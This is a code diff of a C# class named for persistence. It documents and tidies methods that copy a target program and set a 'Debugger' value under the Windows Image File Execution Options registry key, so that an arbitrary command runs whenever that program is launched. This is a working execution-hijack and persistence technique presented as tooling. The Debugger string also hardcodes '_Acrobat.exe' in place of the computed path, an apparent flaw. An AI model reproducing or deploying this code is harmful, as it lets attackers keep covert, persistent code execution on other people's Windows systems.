@@ -33,8 +33,10 @@ namespace Persistence
         }
 
         /// <summary>
-        /// 
+        /// Replace the program that will be executed instead of another
         /// </summary>
+        /// <param name="programName">A program whose closure needs to be monitored</param>
+        /// <param name="commandToExecute">The command that should be executed</param>
         public void ReplaceProgram(string programName, string commandToExecute)
         {
             var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
@@ -44,21 +46,25 @@ namespace Persistence
 
             // subkey.DeleteValue("Debugger");
         }
-
+        
         /// <summary>
-        /// 
+        /// Running the command after closing the program
         /// </summary>
+        /// <param name="programName">A program whose closure needs to be monitored</param>
+        /// <param name="commandToExecute">The command that should be executed</param>
         public void ExecProgAndCommand(string programName, string commandToExecute)
         {
             var pathToFile = Utils.FindFile(programName);
             var newPathToFile = Path.Combine(pathToFile.Replace(Path.GetFileName(pathToFile), String.Empty), "_" + Path.GetFileName(pathToFile));
-            Console.WriteLine(newPathToFile);
+
+            if (File.Exists(newPathToFile))
+                File.Delete(newPathToFile);
+
             File.Copy(pathToFile, newPathToFile);
 
             var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
                                           true);
             ArgumentNullException.ThrowIfNull(subkey);
-            Console.WriteLine(@$"cmd /C " + "\"" + newPathToFile + "\"" + " & calc.exe");
             subkey.SetValue("Debugger", @$"cmd /C _Acrobat.exe & {commandToExecute}", RegistryValueKind.String);
 
             // subkey.DeleteValue("Debugger");
